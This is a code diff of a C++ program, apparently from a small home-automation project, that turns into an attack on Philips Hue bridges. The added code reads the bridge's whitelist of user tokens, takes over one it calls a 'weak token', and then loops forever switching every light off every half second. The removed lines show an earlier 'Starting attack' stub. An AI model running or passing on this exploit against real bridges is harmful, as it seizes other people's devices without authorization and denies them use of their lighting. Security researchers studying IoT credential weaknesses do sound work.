@@ -3,43 +3,66 @@
 // DMC_NODE
 //
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
 #include <iostream>
-#include <Poco/Net/HTTPRequest.h>
-#include <Poco/Net/HTTPResponse.h>
-#include <Poco/Net/HTTPClientSession.h>
+#include <fstream>
 #include <cjson/json.h>
+#include <backEnd/deviceDrivers/HueDriver.h>
 
-using namespace Poco::Net;
+using namespace cjson;
+using namespace std;
+using namespace dmc::hue;
+
+
+Json config;
+HueDriver* gDriver = nullptr;
 
 int main(int, const char**) {
-	
-	std::cout << "Starting attack" << std::endl;
-	
-	HTTPClientSession session("10.100.3.211");
-	HTTPRequest lightsList;
-	lightsList.setMethod("GET");
-	lightsList.setURI("/api/attack/lights");
-	session.sendRequest(lightsList);
+	// Init hue driver
+	config.parse(fstream("config.json"));
+	HueDriver::init(config["bridge"]);
+	gDriver = HueDriver::get();
 
-	HTTPResponse responseLightsList;
-	std::istream& resp =  session.receiveResponse(responseLightsList);
-	std::istreambuf_iterator<char> stmBuff;
-	std::string responseString(std::istreambuf_iterator<char>(resp), stmBuff);
-
-	std::cout << responseString << std::endl;
-
-	system("PAUSE");
-	/*HTTPRequest cmdOff;
-	cmdOff.setMethod("PUT");
-	cmdOff.setURI("/api/attack/lights/2/state");
-	std::string body = "{\n\t\"on\": false\n}";
-	cmdOff.setContentLength(body.size());
-
-	for (;;) {
-		session.sendRequest(cmdOff) << body;
-		Sleep(500);
+	// Get whitelist users
+	Json bridgeData;
+	gDriver->getData("/config/", bridgeData, cout);
+	Json whitelist = bridgeData["whitelist"];
+	// Find a weak user token
+	string token = "";
+	for (auto i = whitelist.begin(); i != whitelist.end(); ++i) {
+		if (i.key().size() < 32 && i.key() != "newdeveloper") // Weak token
+		{
+			token = i.key();
+			break;
+		}
 	}
-	*/
+	// Try to attack
+	if (!token.empty()) {
+		// Reset driver with new user
+		config["bridge"]["user"] = token;
+		HueDriver::end();
+		HueDriver::init(config["bridge"]);
+		gDriver = HueDriver::get();
 
+		for (;;) {
+			// Get lights list
+			std::vector<std::string> lights;
+			Json lightsData;
+			gDriver->getData("/lights/", lightsData, cout);
+			for (auto i = lightsData.begin(); i != lightsData.end(); ++i)
+				lights.push_back(i.key());
+			
+			// Turn all lights off
+			Json off;
+			off.parse("{\"on\": false}");
+			for (auto l : lights) { // Iterate over all lights
+				string url = string("/lights/") + l + "/state";
+				gDriver->putData(url, off, cout);
+			}
+
+			Sleep(500);
+		}
+	}
+	else {
+		cout << "Can't find any user to attack\n";
+	}
 }
